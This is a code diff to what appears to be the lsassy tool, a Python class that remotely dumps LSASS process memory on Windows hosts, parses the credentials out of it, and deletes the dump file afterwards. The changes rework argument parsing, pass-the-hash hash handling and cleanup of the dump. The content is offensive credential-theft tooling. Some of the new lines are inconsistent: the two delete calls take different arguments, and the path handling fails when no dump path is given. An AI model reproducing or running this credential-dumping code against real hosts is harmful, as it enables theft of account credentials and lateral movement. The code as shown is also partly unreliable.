@@ -29,44 +29,44 @@ class TLsassy(Thread):
         Main method to dump credentials on a remote host
         """
         session, file, dumper, method = None, None, None, None
-        try:
-            # Credential parsing
-            username = self.args.username if self.args.username else ""
-            password = self.args.password if self.args.password else ""
+        # Credential parsing
+        username = self.args.username if self.args.username else ""
+        password = self.args.password if self.args.password else ""
 
-            if password == "" and username != "" and self.args.hashes is None and self.args.no_pass is False and self.args.aesKey is None:
-                from getpass import getpass
-                password = getpass("Password:")
+        if password == "" and username != "" and self.args.hashes is None and self.args.no_pass is False and self.args.aesKey is None:
+            from getpass import getpass
+            password = getpass("Password:")
 
-            lmhash, nthash = "", ""
-            if not password and self.args.hashes:
-                if ":" in self.args.hashes:
-                    lmhash, nthash = self.args.hashes.split(":")
-                else:
-                    lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
+        lmhash, nthash = "", ""
+        if not password and self.args.hashes:
+            if ":" in self.args.hashes:
+                lmhash, nthash = self.args.hashes.split(":")
+            else:
+                lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
 
-            # Exec methods parsing
-            exec_methods = self.args.exec.split(",") if self.args.exec else None
+        # Exec methods parsing
+        exec_methods = self.args.exec.split(",") if self.args.exec else None
 
-            # Dump modules options parsing
-            options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
+        # Dump modules options parsing
+        options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
 
-            # Dump path checks
-            dump_path = self.args.dump_path
-            if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
-                if dump_path[0] != "C":
-                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
-                    exit(1)
-                dump_path = dump_path[2:]
-            if dump_path and dump_path[-1] != "\\":
-                dump_path += "\\"
-
-            parse_only = self.args.parse_only
-
-            if parse_only and (dump_path is None or self.args.dump_name is None):
-                logging.error("--dump-path and --dump-name required for --parse-only option")
+        # Dump path checks
+        dump_path = self.args.dump_path.replace('/', '\\')
+        if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
+            if dump_path[0] != "C":
+                logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
                 exit(1)
+            dump_path = dump_path[2:]
+        if dump_path and dump_path[-1] != "\\":
+            dump_path += "\\"
 
+        parse_only = self.args.parse_only
+
+        if parse_only and (dump_path is None or self.args.dump_name is None):
+            logging.error("--dump-path and --dump-name required for --parse-only option")
+            exit(1)
+
+        try:
             session = Session()
             session.get_session(
                 address=self.target,
@@ -87,7 +87,7 @@ class TLsassy(Thread):
                 exit(1)
 
             if not parse_only:
-                dumper = Dumper(session).load(self.args.dump_method)
+                dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
                 if dumper is None:
                     logging.error("Unable to load dump module")
                     exit(1)
@@ -110,8 +110,10 @@ class TLsassy(Thread):
 
             credentials = Parser(file).parse(parse_only=parse_only)
 
+            file.close()
+
             if not parse_only:
-                file.delete(timeout=self.args.timeout)
+                ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
                 logging.debug("Lsass dump successfully deleted")
             else:
                 logging.debug("Not deleting lsass dump as --parse-only was provided")
@@ -127,14 +129,26 @@ class TLsassy(Thread):
                     quiet=self.args.quiet,
                     users_only=self.args.users
                 )
+
         except Exception as e:
             logging.error("An unknown error has occurred.", exc_info=True)
         finally:
             try:
-                file.delete(timeout=self.args.timeout)
-                logging.debug("Lsass dump removed")
+                dumper.clean()
             except:
                 pass
+
+            try:
+                file.close()
+            except:
+                pass
+
+            if not parse_only:
+                try:
+                    ImpacketFile.delete(file, timeout=self.args.timeout)
+                    logging.debug("Lsass dump removed")
+                except:
+                    pass
 
             try:
                 session.smb_session.close()
